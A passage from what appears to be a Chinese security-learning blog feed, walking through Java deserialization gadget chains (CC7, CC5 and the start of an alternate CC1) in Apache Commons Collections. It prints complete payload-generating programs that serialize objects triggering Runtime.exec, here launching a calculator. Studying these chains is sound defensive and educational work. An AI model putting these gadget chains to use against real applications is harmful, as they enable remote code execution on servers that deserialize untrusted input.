class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);<br>LazyMap1.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>LazyMap2.put(<span class="hljs-string">&quot;bb&quot;</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>hashtable.put(LazyMap1,<span class="hljs-number">1</span>);<br>hashtable.put(LazyMap2,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h4 id="前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。"><a href="#前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。" class="headerlink" title="前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。"></a>前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。</h4><p>在反序列化时，reconstitutionPut方法中的if判断中两个元素的hash值必须相同的情况下，才会调用eauals方法。这也是为什么我们在构造利用链的时候必须添加两个两个元素，虽然这两个元素的hash值是一样的，但本质上是两个不同的元素。</p><p>可以打印出两个元素的hash：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(LazyMap1.hashCode());<br>System.out.println(LazyMap2.hashCode());<br></code></pre></td></tr></table></figure><p>这里给出两组hash相同的值：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">yy与zZ<br>Ea与FB<br></code></pre></td></tr></table></figure><h4 id="关于lazyMap2集合中的第二个元素（yy-yy）从何而来"><a href="#关于lazyMap2集合中的第二个元素（yy-yy）从何而来" class="headerlink" title="关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来"></a>关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来</h4><p>Hashtable在添加第二个元素时，lazyMap2集合会“莫名其妙”添加一个元素yy，后面仔细跟踪了Hashtable添加元素的过程才发现，Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法put一个元素yy：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192255444.png" alt="image-20240418192255444"></p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192306401.png" alt="image-20240418192306401"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">hashtable.put(LazyMap2,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>这句代码执行完毕后，LazyMap2里就有了两个元素，zZ和yy。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192412105.png" alt="image-20240418192412105"></p><p>当在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/20210823095600172.png" alt="20210823095600172"></p><p>因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素yy才能触发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192449262.png" alt="image-20240418192449262"></p><h1 id="完整CC7链："><a href="#完整CC7链：" class="headerlink" title="完整CC7链："></a>完整CC7链：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);<br>        LazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        LazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(LazyMap1,<span class="hljs-number">1</span>);<br>        hashtable.put(LazyMap2,<span class="hljs-number">1</span>);<br>        LazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br><br>        serialize(hashtable);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>断断续续学了一周，总算是把7条CC链学完了，成功迈出了学习java安全的第一步，下面就是做题和其他的链子了。总的来说CC链学会调试，学会基本方法和思路来说不是很难，很多链子都是互相相似的，比如CC1与CC5、CC7等。重要的链子就是CC1、CC3、CC6这三条，CC1的动态代理，CC3的代码执行。</p><p>学不懂多看几遍视频，多看几篇文章，虽然很难，慢慢啃肯定是没问题的，更何况我们是站在前人的肩膀上。</p><hr style="border: 1px solid black;"/><p><strong>自己有了光芒才配得上自己追逐的星星。</strong></p><hr style="border: 1px solid black;"/><p>继续加油吧！</p><p>最后附上CC链的思维导图：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/CCchains.jpg" alt="CCchains"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC5链</title>
    <link href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5%E9%93%BE/"/>
    <url>/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>CC5也是在CC1的路线上改了改入口类。</p><p>从AnnotationInvocationHandler.readObject改成了BadAttributeValueExpException.readObject</p><p>沿用CC1从LazyMap.get之后的部分。</p><h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>在TiedMapEntry类的getValue方法也调用了get方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>而本类的toString方法又调用了getValue方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>&#125;<br></code></pre></td></tr></table></figure><p>在BadAttributeValueExpException的readObject方法调用了toString方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>        val = <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();        <span class="hljs-comment">//toString</span><br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此想办法让valObj是TiedMapEntry类的对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br><span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>先调用readFields从流中读取了所有的持久化字段，然后调用get()方法得到了名字是val的字段。也就是这个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object val;<br></code></pre></td></tr></table></figure><p>同时注意一下这个类，看一下就知道这个类其实也是可以反序列化的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>   &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Throwable</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Throwable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br></code></pre></td></tr></table></figure><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>之前在CC6链中了解到TiedMapEntry类需要一个map对象，需要一个随便什么key。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-built_in">this</span>.key = key;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure><p>我们看一下BadAttributeValueExpException类的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>    <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里他需要的参数就是val，我们直接传入tiedMapEntry试试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br></code></pre></td></tr></table></figure><p>运行代码发现，在序列化的时候弹了计算器，但是在反序列化的时候并没有，这个问题已经解决过两次了，还是老方法解决：先在给BadAttributeValueExpException传参数的时候不传入tiedMapEntry对象，然后反射修改val的值为tiedMapEntry就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//反射修改val的值为tiedMapEntry</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">valField</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valField.setAccessible(<span class="hljs-literal">true</span>);<br>valField.set(badAttributeValueExpException,tiedMapEntry);<br></code></pre></td></tr></table></figure><h2 id="给出完整CC5链："><a href="#给出完整CC5链：" class="headerlink" title="给出完整CC5链："></a>给出完整CC5链：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; outMap = LazyMap.decorate(inmap,chainedTransformer);<br><br>        <span class="hljs-comment">//CC5的开头</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射修改val的值为tiedMapEntry</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valField</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valField.setAccessible(<span class="hljs-literal">true</span>);<br>        valField.set(badAttributeValueExpException,tiedMapEntry);<br><br>        serialize(badAttributeValueExpException);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——另一条CC1链</title>
    <link href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/"/>
    <url>/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>之前的CC1链是利用TransformedMap的checkSetValue方法来调用ChainedTransformer.transform</p><p>而另一种写法是利用LazyMap.get方法走动态代理来调用ChainedTransformer.transform</p><h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>我们看一下LazyMap类里的get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);      <span class="hljs-comment">//这里调了factory的transform</span><br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>而这里的factory</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br></code></pre></td></tr></table></figure><p>是可以传的，也就是说到时候我们把factory的值传成ChainedTransformer，然后走进那个if里面就可以。</p><p>还是在AnnotationInvocationHandler类里的invoke方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>…………<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var4);<br>…………<br>&#125;<br></code></pre></td></tr></table></figure><p>而这里的memberValues我们可以控制，所以我们只需要动态代理这个类，然后随便调用其中一个方法，就会触发invoke。然后因为AnnotationInvocationHandler的readObject可以接受一个map，就让它代理一个map</p><p>这就是整条链的思路：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/image-20240417210451418.png" alt="image-20240417210451418"></p><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>我们详细来看看invoke方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 